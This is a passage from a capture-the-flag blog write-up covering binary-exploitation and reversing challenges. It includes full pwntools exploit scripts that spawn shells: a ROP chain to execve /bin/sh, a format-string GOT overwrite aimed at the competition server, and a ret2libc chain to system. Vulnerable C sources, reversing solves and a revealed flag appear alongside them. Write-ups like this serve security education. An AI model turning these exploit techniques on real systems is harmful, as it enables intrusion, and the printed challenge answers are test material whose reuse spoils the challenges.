class="number">0x0000000000401371</span></span><br><span class="line">    xor_rsi_rsi = <span class="number">0x000000000040137e</span></span><br><span class="line">    xor_rdx_rdx = <span class="number">0x000000000040138d</span> </span><br><span class="line">    mov_rsp_rdi = <span class="number">0x000000000040139c</span></span><br><span class="line">    syscall = <span class="number">0x00000000004013af</span></span><br><span class="line"></span><br><span class="line">    bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># build ROP chain to open shell</span></span><br><span class="line">    chain = p64(pop_rax) + p64(<span class="number">0x3b</span>)  <span class="comment"># RAX = 0x3b for execve()</span></span><br><span class="line">    chain += p64(xor_rsi_rsi)  <span class="comment"># RSI = 0</span></span><br><span class="line">    chain += p64(xor_rdx_rdx)  <span class="comment"># RDX = 0</span></span><br><span class="line">    chain += p64(mov_rsp_rdi) </span><br><span class="line">    chain += bin_sh </span><br><span class="line">    chain += p64(syscall)  <span class="comment"># call syscall</span></span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">40</span>) + chain</span><br><span class="line"></span><br><span class="line">    r.sendline(payload) </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="canaleak"><a href="#canaleak" class="headerlink" title="canaleak"></a>canaleak</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Canary is a random value assigned in memory to protect the stack. When this value changes, the program terminates abnormally.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// alarm(600);</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> nope[<span class="number">20</span>];</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">strcmp</span>(nope, <span class="string">&quot;YES&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can&#x27;t overwrite return address if canary is enabled.\nDo you &quot;</span></span><br><span class="line">           <span class="string">&quot;agree with me? : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, nope);</span><br><span class="line">    <span class="built_in">printf</span>(nope);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>again typical format string vuln with partial relro </p><p><img src="/imgs/post4/pwn/canaleak_checksec.png" alt="checksec"></p><p>i overwrote the <code>printf@got</code> with <code>win</code>  function </p><h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process()</span></span><br><span class="line">p = remote(<span class="string">&quot;canaleak-pwn.wanictf.org&quot;</span>,<span class="number">9006</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">got_ow</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">                elf.got.printf: elf.sym.win</span><br><span class="line">            &#125;</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>,payload,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload </span><br><span class="line"></span><br><span class="line">payload = got_ow() </span><br><span class="line">p.recvuntil(<span class="string">&quot;me? : &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><blockquote><p>-&gt; To use gadgets in libc, you need to determine the location of libc in memory.<br>-&gt; The return address from the main function already contains an address from libc. Although this address changes each time the program is executed, the relative address of libc is constant.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READ_LEN 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_stack</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n  #############################################\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #                stack state                #\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #############################################\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                 hex           string\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READ_LEN; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; +0x%02x | 0x%016lx | &quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span> *)(buf + i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">-1</span>; j--) &#123;</span><br><span class="line">      <span class="type">char</span> c = *(<span class="type">char</span> *)(buf + i + j);</span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="number">0x7e</span> || c &lt; <span class="number">0x20</span>)</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; | &lt;- TARGET!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; |\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ofs = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you master ROP?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (ofs &lt; MAX_READ_LEN) &#123;</span><br><span class="line">    show_stack(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your input (max. %d bytes) &gt; &quot;</span>, MAX_READ_LEN - ofs);</span><br><span class="line">    ret = read(<span class="number">0</span>, buf + ofs, MAX_READ_LEN - ofs);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ofs += ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>running binary</p><p><img src="/imgs/post4/pwn/ret2libc_run.png" alt="ret2libc"></p><p>leak the libc adress we can use this to calculate the base of libc </p><h4 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)  </span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span> </span><br><span class="line">offset = <span class="number">40</span> </span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27; continue &#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">## Allows you to switch between local/GDB/remote from terminal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## leaking libc</span></span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot; +0x28 | &quot;</span>)</span><br><span class="line">    leak1 = r.recvline().split(<span class="string">b&quot;|&quot;</span>)[<span class="number">0</span>].strip()  </span><br><span class="line">    leak1 = <span class="built_in">int</span>(leak1,<span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;leak1 : &quot;</span>, <span class="built_in">hex</span>(leak1)) </span><br><span class="line"></span><br><span class="line">    <span class="comment">## calculating libc base</span></span><br><span class="line">    <span class="comment">#libc.address = leak1 - (libc.symbols[&#x27;__libc_start_call_main&#x27;]+128) </span></span><br><span class="line">    libc.address = leak1 - <span class="number">0x29d90</span> <span class="comment"># libc offset </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc base : &quot;</span>, <span class="built_in">hex</span>(libc.address)) </span><br><span class="line">    </span><br><span class="line">   <span class="comment">## addresses </span></span><br><span class="line">    ret = <span class="number">0x0000000040101a</span></span><br><span class="line">    pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)) </span><br><span class="line">    system = libc.sym.system </span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;pop_rdi : 0x%x&quot;</span>%pop_rdi) </span><br><span class="line">    log.info(<span class="string">&quot;bin_sh : 0x%x&quot;</span>%bin_sh) </span><br><span class="line">    log.info(<span class="string">&quot;system : 0x%x&quot;</span>%system) </span><br><span class="line">    </span><br><span class="line">    payload1 = cyclic(<span class="number">40</span>) + pack(ret) + pack(pop_rdi) + pack(bin_sh) + pack(system)</span><br><span class="line">    <span class="comment">#payload2 = cyclic(40) + pack(libc.address + 0xebcf8)</span></span><br><span class="line"></span><br><span class="line">    r.sendline(payload1.ljust(<span class="number">128</span>,<span class="string">b&quot;i&quot;</span>))</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="time-table"><a href="#time-table" class="headerlink" title="time table"></a>time table</h3><p>zzzzzzzzzzzz</p><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Just-Passw0rd"><a href="#Just-Passw0rd" class="headerlink" title="Just_Passw0rd"></a>Just_Passw0rd</h3><p><img src="/imgs/post4/rev/just_password.png" alt="just_password"></p><h3 id="javersing"><a href="#javersing" class="headerlink" title="javersing"></a>javersing</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javersing</span> &#123;  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] paramArrayOfString)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;Fcn_yDlvaGpj_Logi&#125;eias&#123;iaeAm_s&quot;</span>;  </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="literal">true</span>;  </span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">    System.out.println(<span class="string">&quot;Input password: &quot;</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> scanner.nextLine();  </span><br><span class="line">    str2 = String.format(<span class="string">&quot;%30s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; str2 &#125;).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;0&quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>; b &lt; <span class="number">30</span>; b++) &#123;  </span><br><span class="line">      <span class="keyword">if</span> (str2.charAt(b * <span class="number">7</span> % <span class="number">30</span>) != str1.charAt(b))  </span><br><span class="line">        bool = <span class="literal">false</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (bool) &#123;  </span><br><span class="line">      System.out.println(<span class="string">&quot;Correct!&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">      System.out.println(<span class="string">&quot;Incorrect...&quot;</span>);  </span><br><span class="line">    &#125;   </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>okay i didn’t figure out this challenge at run time but later got to realize i just had to find the inverse of 7 modulo 30 to reverse the logic </p><p>To find the inverse of 7 modulo 30, we need to find a number x such that:</p><p>7x ≡ 1 (mod 30)</p><p>In other words, we are looking for a number x such that when we multiply 7 by x and then take the result modulo 30, we get a remainder of 1.<br>One way to solve this is to use the extended Euclidean algorithm. We can write:</p><p>30 &#x3D; 4 × 7 + 2 7 &#x3D; 3 × 2 + 1</p><p>Now we can work backwards to find the values of x and y that satisfy:</p><p>1 &#x3D; 7 − 3 × 2 1 &#x3D;&gt; 7 − 3(30 − 4 × 7) 1 &#x3D;&gt; 13 × 7 − 3 × 30</p><p>Therefore, the inverse of 7 modulo 30 is 13. In other words, 7 and 13 are multiplicative inverses modulo 30, since:</p><p>7 × 13 ≡ 1 (mod 30)</p><h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><p><img src="/imgs/post4/rev/javersing.png" alt="javaversing"></p><p><strong>Edit:</strong> silly me, me noob kept doing this</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;Fcn_yDlvaGpj_Logi&#125;eias&#123;iaeAm_s&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    flag += <span class="built_in">str</span>[i*<span class="number">7</span>%<span class="number">30</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>instead </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;Fcn_yDlvaGpj_Logi&#125;eias&#123;iaeAm_s&quot;</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    flag[i*<span class="number">7</span>%<span class="number">30</span>] = <span class="built_in">str</span>[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">FLAG&#123;Decompiling_java_is_easy&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="fermat"><a href="#fermat" class="headerlink" title="fermat"></a>fermat</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_bc;</span><br><span class="line">  undefined4 local_b8 [<span class="number">20</span>];</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  </span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_b8[<span class="number">0</span>] = <span class="number">0xf781fc86</span>;</span><br><span class="line">  local_b8[<span class="number">1</span>] = <span class="number">0xc5afc9bb</span>;</span><br><span class="line">  local_b8[<span class="number">2</span>] = <span class="number">0xd5a5de9f</span>;</span><br><span class="line">  local_b8[<span class="number">3</span>] = <span class="number">0xefa1efa4</span>;</span><br><span class="line">  local_b8[<span class="number">4</span>] = <span class="number">0xefb4dfac</span>;</span><br><span class="line">  local_b8[<span class="number">5</span>] = <span class="number">0xc49fd6af</span>;</span><br><span class="line">  local_b8[<span class="number">6</span>] = <span class="number">0xefa5dda9</span>;</span><br><span class="line">  local_b8[<span class="number">7</span>] = <span class="number">0xefa4dea1</span>;</span><br><span class="line">  local_b8[<span class="number">8</span>] = <span class="number">0xdfa6d6a5</span>;</span><br><span class="line">  local_b8[<span class="number">9</span>] = <span class="number">0xc49fc4b2</span>;</span><br><span class="line">  local_b8[<span class="number">10</span>] = <span class="number">0xdfb3efaf</span>;</span><br><span class="line">  local_b8[<span class="number">11</span>] = <span class="number">0xefa5c6ac</span>;</span><br><span class="line">  local_b8[<span class="number">12</span>] = <span class="number">0xd5b6d5b2</span>;</span><br><span class="line">  local_b8[<span class="number">13</span>] = <span class="number">0xdea9c3b2</span>;</span><br><span class="line">  local_b8[<span class="number">14</span>] = <span class="number">0x80f2efa7</span>;</span><br><span class="line">  local_b8[<span class="number">15</span>] = <span class="number">0x87f4d2f8</span>;</span><br><span class="line">  local_b8[<span class="number">16</span>] = <span class="number">0x86f6d4a2</span>;</span><br><span class="line">  local_b8[<span class="number">17</span>] = <span class="number">0xd4a382a3</span>;</span><br><span class="line">  local_b8[<span class="number">18</span>] = <span class="number">0xb0c0cdf8</span>;</span><br><span class="line">  local_68 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (local_bc = <span class="number">0</span>; local_bc &lt; <span class="number">0x13</span>; local_bc = local_bc + <span class="number">1</span>) &#123;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc &lt;&lt; <span class="number">2</span>)) = (byte)local_b8[local_bc] ^ <span class="number">0xc0</span>;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc * <span class="number">4</span> + <span class="number">1</span>)) =</span><br><span class="line">         (byte)((uint)local_b8[local_bc] &gt;&gt; <span class="number">8</span>) ^ <span class="number">0xb0</span>;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc * <span class="number">4</span> + <span class="number">2</span>)) =</span><br><span class="line">         (byte)((uint)local_b8[local_bc] &gt;&gt; <span class="number">0x10</span>) ^ <span class="number">0xc0</span>;</span><br><span class="line">    *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)(local_bc * <span class="number">4</span> + <span class="number">3</span>)) =</span><br><span class="line">         (byte)((uint)local_b8[local_bc] &gt;&gt; <span class="number">0x18</span>) ^ <span class="number">0xb0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>((<span class="type">char</span> *)&amp;local_68);</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>():</span><br><span class="line">    local_b8 = [<span class="number">0xf781fc86</span>, <span class="number">0xc5afc9bb</span>, <span class="number">0xd5a5de9f</span>, <span class="number">0xefa1efa4</span>, <span class="number">0xefb4dfac</span>,</span><br><span class="line">                <span class="number">0xc49fd6af</span>, <span class="number">0xefa5dda9</span>, <span class="number">0xefa4dea1</span>, <span class="number">0xdfa6d6a5</span>, <span class="number">0xc49fc4b2</span>,</span><br><span class="line">                <span class="number">0xdfb3efaf</span>, <span class="number">0xefa5c6ac</span>, <span class="number">0xd5b6d5b2</span>, <span class="number">0xdea9c3b2</span>, <span class="number">0x80f2efa7</span>,</span><br><span class="line">                <span class="number">0x87f4d2f8</span>, <span class="number">0x86f6d4a2</span>, <span class="number">0xd4a382a3</span>, <span class="number">0xb0c0cdf8</span>]</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> local_b8:</span><br><span 